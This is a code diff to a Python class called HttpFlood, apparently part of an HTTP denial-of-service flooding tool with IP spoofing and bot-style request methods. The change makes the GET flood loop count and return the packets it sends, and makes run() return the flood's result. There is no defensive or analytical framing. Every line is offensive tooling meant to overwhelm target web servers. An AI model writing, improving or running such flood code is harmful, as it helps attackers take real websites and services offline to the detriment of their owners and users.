@@ -614,7 +614,7 @@ class HttpFlood:
         self.select(self._method)
 
     def run(self) -> None:
-        self.SENT_FLOOD()
+        return self.SENT_FLOOD()
 
     @property
     def SpoofIP(self) -> str:
@@ -751,12 +751,14 @@ class HttpFlood:
 
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
+                packets += 1
+                if not self._event.is_set(): return 0
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
+        return packets
 
     def BOT(self) -> None:
         payload: bytes = self.generate_payload()
